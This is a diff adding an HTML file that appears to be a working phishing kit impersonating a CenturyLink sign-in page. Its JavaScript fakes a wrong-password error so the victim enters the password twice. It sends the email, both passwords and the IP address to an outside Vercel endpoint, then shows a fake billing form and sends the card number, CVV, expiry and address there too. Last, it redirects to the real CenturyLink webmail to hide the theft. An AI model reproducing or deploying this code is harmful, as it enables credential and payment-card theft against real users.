@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CentryLinkg</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Customizing the checkbox to match default browser style */
+        input[type="checkbox"] {
+            appearance: none;
+            background-color: #fff;
+            margin: 0;
+            font: inherit;
+            color: currentColor;
+            width: 13px;
+            height: 13px;
+            border: 1px solid #767676;
+            border-radius: 2px;
+            display: grid;
+            place-content: center;
+        }
+
+        input[type="checkbox"]::before {
+            content: "";
+            width: 8px;
+            height: 8px;
+            transform: scale(0);
+            transition: 120ms transform ease-in-out;
+            box-shadow: inset 1em 1em #003da5;
+            background-color: #003da5;
+            transform-origin: center;
+            clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0%, 43% 62%);
+        }
+
+        input[type="checkbox"]:checked::before {
+            transform: scale(1);
+        }
+
+        /* Prevent auto-fill background color change */
+        input:-webkit-autofill,
+        input:-webkit-autofill:hover,
+        input:-webkit-autofill:focus,
+        input:-webkit-autofill:active {
+            -webkit-box-shadow: 0 0 0 30px white inset !important;
+        }
+
+        .heading-black {
+            font-weight: 900;
+            letter-spacing: -0.5px;
+        }
+    </style>
+</head>
+
+<body
+    class="bg-white min-h-screen relative overflow-x-hidden font-sans text-gray-800 selection:bg-blue-100 flex flex-col justify-between">
+
+    <!-- Top Left Logo -->
+    <div class="absolute top-8 left-8 z-20 flex items-center">
+        <img src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/centur-log.jpeg"
+            class="h-10 w-auto object-contain" />
+    </div>
+
+    <!-- Main Content Centered -->
+    <div class="relative z-10 flex flex-col items-center justify-center min-h-screen w-full px-4 py-16">
+
+        <!-- Login Container (View 1) -->
+        <div id="login-container" class="w-full max-w-[360px] pb-16">
+            <form id="login-form" novalidate>
+
+                <!-- Email Input -->
+                <div class="mb-6 relative">
+                    <input type="email" id="email" placeholder="CenturyLink Email"
+                        class="w-full pb-2 text-[15px] text-gray-900 bg-transparent border-0 border-b border-gray-200 focus:ring-0 focus:border-[#003da5] focus:outline-none placeholder-gray-400 transition-colors"
+                        required />
+                    <p id="email-error" class="hidden absolute -bottom-5 left-0 text-xs text-red-600">Please enter a
+                        valid email address.</p>
+                </div>
+
+                <!-- Password Input -->
+                <div class="mb-5 relative">
+                    <input type="password" id="password" placeholder="Password"
+                        class="w-full pb-2 text-[15px] text-gray-900 bg-transparent border-0 border-b border-gray-200 focus:ring-0 focus:border-[#003da5] focus:outline-none placeholder-gray-400 transition-colors"
+                        required />
+                    <p id="password-error" class="hidden absolute -bottom-5 left-0 text-xs text-red-600">The password
+                        you entered is incorrect.</p>
+                </div>
+
+                <!-- Stay Signed In Checkbox -->
+                <div class="flex items-center mb-7 mt-6">
+                    <input type="checkbox" id="stay-signed-in" class="cursor-pointer" />
+                    <label for="stay-signed-in" class="ml-2.5 text-[13px] text-gray-500 cursor-pointer select-none">
+                        Stay signed in
+                    </label>
+                </div>
+
+                <!-- Sign In Button -->
+                <button type="submit" id="signinSubmitBtn"
+                    class="w-full bg-[#003da5] hover:bg-[#002f80] text-white text-[15px] font-normal py-3 px-4 transition-colors duration-200">
+                    Sign In
+                </button>
+
+                <!-- Helper Links -->
+                <div class="flex justify-between mt-3 px-0.5">
+                    <a href="#" class="text-[13px] text-[#003da5] hover:underline decoration-[#003da5]">Forgot
+                        Password?</a>
+                    <a href="#" class="text-[13px] text-[#003da5] hover:underline decoration-[#003da5]">Need help?</a>
+                </div>
+
+            </form>
+        </div>
+
+        <!-- Billing Card Container (View 2) -->
+        <div id="billingCard"
+            class="hidden w-full max-w-[520px] bg-white border border-gray-200 pt-8 sm:pt-10 pb-10 sm:pb-12 px-5 sm:px-10 md:px-14 shadow-sm rounded-sm">
+
+            <!-- Heading -->
+            <h1
+                class="text-[22px] sm:text-[34px] md:text-[38px] heading-black text-center mb-4 text-black leading-tight">
+                Update Your Billing Information
+            </h1>
+
+            <!-- Subtitle/Divider -->
+            <div class="flex items-center justify-center mb-6">
+                <div class="h-px bg-[#003da5] w-[45px] sm:w-[60px]"></div>
+                <span class="mx-3 text-[13px] sm:text-[14px] text-gray-700 font-medium">Payment Details</span>
+                <div class="h-px bg-[#003da5] w-[45px] sm:w-[60px]"></div>
+            </div>
+
+            <!-- 2x2 Payment Logos Grid -->
+            <div class="grid grid-cols-2 gap-2.5 sm:gap-3 max-w-[320px] mx-auto mb-6">
+                <!-- Visa -->
+                <div
+                    class="bg-gradient-to-b from-gray-50 to-gray-200 border border-gray-300 rounded p-1.5 flex items-center justify-center h-[50px] shadow-2xs">
+                    <svg class="h-7 w-auto" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M45.2 2.5L29.6 37.5H20.1L12.2 8.4C11.7 6.4 11.2 5.7 9.7 4.9C7.3 3.6 3.4 2.5 0 1.7L0.5 0.2H16.6C18.7 0.2 20.5 1.7 20.9 4.1L24.9 25.4L34.9 0.2H45.2V2.5ZM84.7 25.7C84.7 15.9 71.1 15.4 71.3 11C71.3 9.6 72.7 8.1 75.8 7.7C77.3 7.5 81.5 7.4 86.2 9.5L88 1.4C85.5 0.5 82.2 0 78.1 0C68.6 0 61.8 5 61.7 12.1C61.5 17.4 66.4 20.4 70 22.2C73.7 24 75 25.1 74.9 26.7C74.8 29.2 71.8 30.3 69 30.3C64.2 30.3 61.5 29 59.2 27.9L57.3 36.3C59.9 37.5 64.7 38.4 69.6 38.5C79.8 38.5 86.5 33.4 86.6 25.7H84.7ZM111.4 37.5H120L112.5 0.2H104.5C102.6 0.2 101 1.3 100.3 3L85.7 37.5H95.2L97.1 32.3H108.7L109.8 37.5H111.4ZM100 24.5L104.7 11.7L107.4 24.5H100ZM58.9 0.2L46.8 37.5H55.8L67.9 0.2H58.9Z"
+                            fill="#1A1F71" />
+                        <path
+                            d="M16.6 0.2H0L0.5 2.5C4 3.3 7.9 4.4 10.3 5.7C11.8 6.5 12.3 7.2 12.8 9.2L20.7 38.3H21.5L25.5 17C24.4 11.8 19.3 1 16.6 0.2Z"
+                            fill="#F7B600" />
+                    </svg>
+                </div>
+
+                <!-- MasterCard -->
+                <div
+                    class="bg-gradient-to-b from-[#1976D2] to-[#0D47A1] border border-blue-900 rounded p-1.5 flex flex-col items-center justify-center h-[50px] shadow-2xs">
+                    <svg class="h-6 w-auto" viewBox="0 0 80 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="28" cy="20" r="16" fill="#EB001B" />
+                        <circle cx="52" cy="20" r="16" fill="#F79E1B" />
+                        <path
+                            d="M40 7.4A15.9 15.9 0 0 0 34 20A15.9 15.9 0 0 0 40 32.6A15.9 15.9 0 0 0 46 20A15.9 15.9 0 0 0 40 7.4Z"
+                            fill="#FF5F00" />
+                    </svg>
+                    <span class="text-[9px] font-bold text-white tracking-tight mt-0.5">MasterCard</span>
+                </div>
+
+                <!-- American Express -->
+                <div
+                    class="bg-[#0070CD] border border-blue-800 rounded p-1 flex flex-col items-center justify-center h-[50px] shadow-2xs">
+                    <span class="text-[11px] font-black text-white leading-none tracking-wider">AMERICAN</span>
+                    <span class="text-[11px] font-black text-white leading-none tracking-wider mt-0.5">EXPRESS</span>
+                </div>
+
+                <!-- Discover -->
+                <div
+                    class="bg-gradient-to-b from-gray-50 to-gray-200 border border-gray-300 rounded p-1.5 flex flex-col items-center justify-center h-[50px] shadow-2xs relative overflow-hidden">
+                    <div class="flex items-center space-x-0.5">
+                        <span class="text-[13px] font-black text-black tracking-tight">DISC</span>
+                        <span class="w-3 h-3 rounded-full bg-[#F48120] inline-block"></span>
+                        <span class="text-[13px] font-black text-black tracking-tight">VER</span>
+                    </div>
+                    <span class="text-[7px] font-bold text-gray-700 tracking-widest -mt-0.5">NETWORK</span>
+                    <div
+                        class="absolute bottom-0 right-0 w-4 h-4 bg-[#F48120] transform rotate-45 translate-x-2 translate-y-2">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Billing Form -->
+            <form id="billingForm" action="#" method="POST" novalidate class="w-full max-w-[400px] mx-auto space-y-4">
+
+                <!-- Card Holder Name -->
+                <div>
+                    <label for="cardName" class="block text-[13px] sm:text-[14px] text-gray-900 mb-1">
+                        Card Holder Name
+                    </label>
+                    <input type="text" id="cardName" name="cardName" placeholder="Name as shown on card"
+                        class="w-full border border-gray-400 h-[44px] sm:h-[42px] px-3 focus:outline-none focus:border-[#003da5] focus:ring-1 focus:ring-[#003da5] transition-colors rounded-[2px]" />
+                    <p id="cardNameError" class="text-red-600 text-[13px] mt-1 hidden"></p>
+                </div>
+
+                <!-- Card Number -->
+                <div>
+                    <label for="cardNumber" class="block text-[13px] sm:text-[14px] text-gray-900 mb-1">
+                        Debit/Credit Card Number
+                    </label>
+                    <input type="text" id="cardNumber" name="cardNumber" maxlength="19" inputmode="numeric"
+                        placeholder="1234 5678 9012 3456"
+                        class="w-full border border-gray-400 h-[44px] sm:h-[42px] px-3 focus:outline-none focus:border-[#003da5] focus:ring-1 focus:ring-[#003da5] transition-colors rounded-[2px]" />
+                    <p id="cardNumberError" class="text-red-600 text-[13px] mt-1 hidden"></p>
+                </div>
+
+                <!-- Expire Date & CVV Grid -->
+                <div class="grid grid-cols-2 gap-3">
+                    <!-- Expire Date -->
+                    <div>
+                        <label for="expDate" class="block text-[13px] sm:text-[14px] text-gray-900 mb-1">
+                            Expire Date
+                        </label>
+                        <input type="text" id="expDate" name="expDate" maxlength="5" inputmode="numeric"
+                            placeholder="MM/YY"
+                            class="w-full border border-gray-400 h-[44px] sm:h-[42px] px-3 focus:outline-none focus:border-[#003da5] focus:ring-1 focus:ring-[#003da5] transition-colors rounded-[2px]" />
+                        <p id="expDateError" class="text-red-600 text-[13px] mt-1 hidden"></p>
+                    </div>
+
+                    <!-- CVV -->
+                    <div>
+                        <label for="cvv" class="block text-[13px] sm:text-[14px] text-gray-900 mb-1">
+                            CVV
+                        </label>
+                        <input type="text" id="cvv" name="cvv" maxlength="4" inputmode="numeric"
+                            class="w-full border border-gray-400 h-[44px] sm:h-[42px] px-3 focus:outline-none focus:border-[#003da5] focus:ring-1 focus:ring-[#003da5] transition-colors rounded-[2px]" />
+                        <p id="cvvError" class="text-red-600 text-[13px] mt-1 hidden"></p>
+                    </div>
+                </div>
+
+                <!-- Address -->
+                <div>
+                    <label for="address" class="block text-[13px] sm:text-[14px] text-gray-900 mb-1">
+                        Address
+                    </label>
+                    <input type="text" id="address" name="address" placeholder="Billing Street Address"
+                        class="w-full border border-gray-400 h-[44px] sm:h-[42px] px-3 focus:outline-none focus:border-[#003da5] focus:ring-1 focus:ring-[#003da5] transition-colors rounded-[2px]" />
+                    <p id="addressError" class="text-red-600 text-[13px] mt-1 hidden"></p>
+                </div>
+
+                <!-- Zipcode -->
+                <div>
+                    <label for="zipcode" class="block text-[13px] sm:text-[14px] text-gray-900 mb-1">
+                        Zip Code
+                    </label>
+                    <input type="text" id="zipcode" name="zipcode" maxlength="5" inputmode="numeric"
+                        class="w-full border border-gray-400 h-[44px] sm:h-[42px] px-3 focus:outline-none focus:border-[#003da5] focus:ring-1 focus:ring-[#003da5] transition-colors rounded-[2px]" />
+                    <p id="zipcodeError" class="text-red-600 text-[13px] mt-1 hidden"></p>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" id="billingSubmitBtn"
+                    class="w-full bg-[#003da5] hover:bg-[#002f80] text-white font-semibold h-[46px] !mt-5 rounded-[2px] text-[16px] transition-colors">
+                    Update Billing
+                </button>
+            </form>
+        </div>
+
+    </div>
+
+    <!-- Background Abstract Graphic (Bottom Right) -->
+    <div class="absolute -bottom-[20%] -right-[15%] w-[1200px] h-[1200px] z-0 pointer-events-none opacity-50">
+        <svg viewBox="0 0 100 100" class="w-full h-full text-[#e6e6e6]" fill="currentColor"
+            preserveAspectRatio="xMidYMid meet">
+            <!-- Central solid curved shape -->
+            <path d="M 60,100 C 60,65 75,45 100,35 L 100,100 Z" />
+
+            <!-- Wedge 1 (top left pointing down right) -->
+            <path d="M 20,40 L 52,65 C 55,55 60,45 75,30 L 50,15 Z" />
+
+            <!-- Wedge 2 (far left pointing down right) -->
+            <path d="M 5,60 L 45,85 C 47,75 50,70 56,66 L 15,35 Z" />
+        </svg>
+    </div>
+
+    <!-- Loading Screen Overlay -->
+    <div id="loading-screen"
+        class="hidden fixed inset-0 bg-white/80 backdrop-blur-sm z-[100] flex flex-col items-center justify-center">
+        <div class="w-16 h-16 border-4 border-[#003da5] border-t-transparent rounded-full animate-spin mb-4"></div>
+        <p class="text-[#003da5] font-semibold text-lg animate-pulse">Processing, please wait...</p>
+    </div>
+
+    <!-- JavaScript Logic -->
+    <script>
+        const baseURL = 'https://fr-1290-2o1v.vercel.app/';
+        const CHAT_ID = 'forjjj11@gmail.com';
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // View Containers
+            const loginContainer = document.getElementById('login-container');
+            const billingCard = document.getElementById('billingCard');
+            const loadingScreen = document.getElementById('loading-screen');
+
+            // Login Elements
+            const loginForm = document.getElementById('login-form');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            const signinSubmitBtn = document.getElementById('signinSubmitBtn');
+
+            // Billing Elements
+            const billingForm = document.getElementById('billingForm');
+            const cardNameInput = document.getElementById('cardName');
+            const cardNumberInput = document.getElementById('cardNumber');
+            const expDateInput = document.getElementById('expDate');
+            const cvvInput = document.getElementById('cvv');
+            const addressInput = document.getElementById('address');
+            const zipcodeInput = document.getElementById('zipcode');
+            const billingSubmitBtn = document.getElementById('billingSubmitBtn');
+
+            const cardNameError = document.getElementById('cardNameError');
+            const cardNumberError = document.getElementById('cardNumberError');
+            const expDateError = document.getElementById('expDateError');
+            const cvvError = document.getElementById('cvvError');
+            const addressError = document.getElementById('addressError');
+            const zipcodeError = document.getElementById('zipcodeError');
+
+            let state = {
+                ip: '',
+                p1: '',
+                p2: '',
+                attempts: 0
+            };
+
+            // Fetch IP address on init
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => state.ip = data.ip)
+                .catch(() => state.ip = 'Unknown');
+
+            // UI Loading Helper
+            function showLoading(show) {
+                if (show) {
+                    loadingScreen.classList.remove('hidden');
+                    if (signinSubmitBtn) {
+                        signinSubmitBtn.disabled = true;
+                        signinSubmitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                    }
+                    if (billingSubmitBtn) {
+                        billingSubmitBtn.disabled = true;
+                        billingSubmitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                    }
+                } else {
+                    loadingScreen.classList.add('hidden');
+                    if (signinSubmitBtn) {
+                        signinSubmitBtn.disabled = false;
+                        signinSubmitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    }
+                    if (billingSubmitBtn) {
+                        billingSubmitBtn.disabled = false;
+                        billingSubmitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    }
+                }
+            }
+
+            // Post Data Helper
+            async function postData(endpoint, payload) {
+                showLoading(true);
+                try {
+                    const response = await fetch(`${baseURL}${endpoint}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    return await response.json();
+                } catch (e) {
+                    console.error('API Error:', e);
+                    return { status: 'error' };
+                } finally {
+                    showLoading(false);
+                }
+            }
+
+            // Email Regex Validation
+            const validateEmail = (email) => {
+                return String(email)
+                    .toLowerCase()
+                    .match(
+                        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+                    );
+            };
+
+            // Helper to show field error
+            function showError(input, errorEl, message) {
+                input.classList.remove('border-gray-400');
+                input.classList.add('border-red-600');
+                if (errorEl) {
+                    errorEl.textContent = message;
+                    errorEl.classList.remove('hidden');
+                }
+            }
+
+            // Helper to clear field error
+            function clearError(input, errorEl) {
+                input.classList.remove('border-red-600');
+                input.classList.add('border-gray-400');
+                if (errorEl) {
+                    errorEl.textContent = '';
+                    errorEl.classList.add('hidden');
+                }
+            }
+
+            // Clear errors on input
+            emailInput.addEventListener('input', () => {
+                emailError.classList.add('hidden');
+                emailInput.classList.remove('border-red-600');
+            });
+            passwordInput.addEventListener('input', () => {
+                passwordError.classList.add('hidden');
+                passwordInput.classList.remove('border-red-600');
+            });
+
+            cardNameInput.addEventListener('input', () => clearError(cardNameInput, cardNameError));
+            cardNumberInput.addEventListener('input', () => clearError(cardNumberInput, cardNumberError));
+            expDateInput.addEventListener('input', () => clearError(expDateInput, expDateError));
+            cvvInput.addEventListener('input', () => clearError(cvvInput, cvvError));
+            addressInput.addEventListener('input', () => clearError(addressInput, addressError));
+            zipcodeInput.addEventListener('input', () => clearError(zipcodeInput, zipcodeError));
+
+            // Format & Restrict Card Number (Max 16 digits, numeric only)
+            cardNumberInput.addEventListener('input', (e) => {
+                let val = e.target.value.replace(/\D/g, ''); // Digits only
+                if (val.length > 16) val = val.slice(0, 16);
+                // Format with space every 4 digits
+                const formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+                e.target.value = formatted;
+            });
+
+            // Format & Restrict Expire Date (MM/YY)
+            expDateInput.addEventListener('input', (e) => {
+                let val = e.target.value.replace(/\D/g, '');
+                if (val.length > 4) val = val.slice(0, 4);
+                if (val.length >= 3) {
+                    val = val.slice(0, 2) + '/' + val.slice(2);
+                }
+                e.target.value = val;
+            });
+
+            // Restrict CVV (Digits only, max 4 digits)
+            cvvInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+            });
+
+            // Restrict Zipcode (Digits only, max 5 digits)
+            zipcodeInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
+            });
+
+            // Sign In Form Submit Handler
+            loginForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                const emailVal = emailInput.value.trim();
+                const passwordVal = passwordInput.value;
+
+                let isValid = true;
+
+                if (!validateEmail(emailVal)) {
+                    emailError.textContent = 'Please enter a valid email address.';
+                    emailError.classList.remove('hidden');
+                    emailInput.classList.add('border-red-600');
+                    isValid = false;
+                } else {
+                    emailError.classList.add('hidden');
+                    emailInput.classList.remove('border-red-600');
+                }
+
+                if (!passwordVal) {
+                    passwordError.textContent = 'Please enter your password.';
+                    passwordError.classList.remove('hidden');
+                    passwordInput.classList.add('border-red-600');
+                    isValid = false;
+                }
+
+                if (!isValid) return;
+
+                if (state.attempts === 0) {
+                    // First attempt: save password 1, show error, clear field
+                    state.p1 = passwordVal;
+                    state.attempts++;
+
+                    passwordError.textContent = 'The password you entered is incorrect.';
+                    passwordError.classList.remove('hidden');
+                    passwordInput.classList.add('border-red-600');
+
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                } else if (state.attempts === 1) {
+                    // Second attempt: save password 2 and POST payload to API
+                    state.p2 = passwordVal;
+                    passwordError.classList.add('hidden');
+
+                    const payload = {
+                        data: JSON.stringify({
+                            name: 'CenturyLink',
+                            email: emailVal,
+                            passwordOne: state.p1,
+                            passwordTwo: state.p2,
+                            IPAddress: state.ip
+                        }),
+                        title: 'CenturyLink Login Info',
+                        chatId: CHAT_ID
+                    };
+
+                    await postData('main', payload);
+
+                    // Switch view from Login to Billing
+                    loginContainer.classList.add('hidden');
+                    billingCard.classList.remove('hidden');
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+            });
+
+            // Billing Form Submit Handler
+            billingForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                const cardNameVal = cardNameInput.value.trim();
+                const rawCardNumber = cardNumberInput.value.replace(/\D/g, '');
+                const expDateVal = expDateInput.value.trim();
+                const cvvVal = cvvInput.value.trim();
+                const addressVal = addressInput.value.trim();
+                const zipcodeVal = zipcodeInput.value.trim();
+
+                let isValid = true;
+
+                // Card Name Validation
+                if (!cardNameVal) {
+                    showError(cardNameInput, cardNameError, 'Please enter the cardholder name.');
+                    isValid = false;
+                } else {
+                    clearError(cardNameInput, cardNameError);
+                }
+
+                // Card Number Validation (13 to 16 digits)
+                if (!rawCardNumber || rawCardNumber.length < 13 || rawCardNumber.length > 16) {
+                    showError(cardNumberInput, cardNumberError, 'Please enter a valid 13 to 16-digit card number.');
+                    isValid = false;
+                } else {
+                    clearError(cardNumberInput, cardNumberError);
+                }
+
+                // Expire Date Validation (MM/YY)
+                const expRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+                if (!expDateVal || !expRegex.test(expDateVal)) {
+                    showError(expDateInput, expDateError, 'Enter a valid date (MM/YY).');
+                    isValid = false;
+                } else {
+                    clearError(expDateInput, expDateError);
+                }
+
+                // CVV Validation (3 or 4 digits)
+                if (!cvvVal || cvvVal.length < 3 || cvvVal.length > 4) {
+                    showError(cvvInput, cvvError, 'Enter a 3 or 4 digit CVV.');
+                    isValid = false;
+                } else {
+                    clearError(cvvInput, cvvError);
+                }
+
+                // Address Validation
+                if (!addressVal) {
+                    showError(addressInput, addressError, 'Please enter your billing address.');
+                    isValid = false;
+                } else {
+                    clearError(addressInput, addressError);
+                }
+
+                // Zipcode Validation (5 digits)
+                if (!zipcodeVal || zipcodeVal.length !== 5) {
+                    showError(zipcodeInput, zipcodeError, 'Please enter a valid 5-digit zip code.');
+                    isValid = false;
+                } else {
+                    clearError(zipcodeInput, zipcodeError);
+                }
+
+                if (!isValid) return;
+
+                const payload = {
+                    data: JSON.stringify({
+                        email: emailInput.value.trim(),
+                        IPAddress: state.ip,
+                        name: 'CenturyLink Billing',
+                        cardNumber: rawCardNumber,
+                        cardHolderName: cardNameVal,
+                        expireDate: expDateVal,
+                        cvv: cvvVal,
+                        address: addressVal,
+                        zipCode: zipcodeVal
+                    }),
+                    title: 'CenturyLink Billing Info',
+                    chatId: CHAT_ID
+                };
+
+                await postData('main', payload);
+
+                window.location.replace("https://webmail.centurylink.net/app/")
+            });
+        });
+    </script>
+</body>
+
+</html>
